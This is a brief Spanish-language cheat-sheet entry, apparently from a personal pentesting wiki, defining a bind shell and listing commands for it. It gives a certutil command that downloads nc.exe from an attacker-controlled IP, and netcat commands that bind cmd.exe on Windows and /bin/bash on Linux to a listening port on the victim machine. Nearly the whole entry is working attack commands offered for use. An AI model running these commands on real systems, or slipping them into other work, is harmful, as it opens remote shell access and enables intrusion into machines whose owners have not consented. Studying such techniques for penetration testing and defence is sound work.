Es aquella que se obtiene al servir una shell desde un puerto de la máquina víctima y conectarse a él desde la máquina atacante. Es lo opuesto a una [[Reverse shell]].

# Ejemplos

## Windows

Para descargar la shell:

```
certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe
```

Y la ponemos en escucha:

```pwsh
netcat.exe -lvnp 4343 -e cmd.exe
```

## Linux

### Netcat

```bash
nc -lvnp 4343 -e /bin/bash
```
> En la máquina víctima.